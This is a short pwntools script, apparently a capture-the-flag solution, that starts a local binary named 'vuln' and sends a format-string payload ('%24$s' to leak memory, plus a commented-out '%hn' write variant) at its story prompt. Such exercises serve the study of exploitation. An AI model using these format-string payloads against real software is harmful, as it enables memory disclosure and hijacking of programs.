from pwn import *
context.log_level = 'debug'

io = process('./vuln')

# payload = b'%37283c%55$hn'
payload = b'%24$s'
io.sendlineafter(b'Tell me a story and then I\'ll tell you one >> ', payload)

io.interactive()